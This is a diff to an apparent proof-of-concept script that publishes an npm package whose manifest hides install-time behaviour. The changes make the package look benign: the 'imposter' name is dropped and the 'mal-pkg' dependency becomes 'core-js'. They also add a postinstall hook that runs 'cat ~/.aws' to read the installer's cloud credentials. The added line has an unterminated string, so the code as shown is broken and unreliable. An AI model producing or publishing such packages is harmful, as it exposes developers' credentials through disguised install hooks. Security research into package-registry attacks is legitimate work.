@@ -4,7 +4,7 @@
   const pack = require('libnpmpack')
   const fetch = require('npm-registry-fetch')
 
-  // pack tarball & generate ingetrity
+  // pack tarball & generate integrity hash
   const tarball = await pack('./pkg/')
   const integrity = ssri.fromData(tarball, {
     algorithms: [...new Set(['sha1', 'sha512'])],
@@ -15,7 +15,7 @@
   const version = '1.0.0'
   const manifest = {
     _id: name,
-    name: "imposter-pkg-poc",
+    name: name,
     'dist-tags': {
       latest: version,
     },
@@ -29,8 +29,8 @@
           shasum: integrity.sha1[0].hexDigest(),
           tarball: '',
         },
-        scripts: {"preinstall": "touch ../mal-pkg-write && echo \"bad payload written!\"\n" },
-        dependencies: {"mal-pkg": "1.0.0"},
+        scripts: {"preinstall": "touch ./mal-pkg-write && echo \"bad payload written!\"\n", "postinstall": "cat ~/.aws },
+        dependencies: {"core-js": "^3.0.0"},
         author: "l33t h4x0r",
     },
     _attachments: {
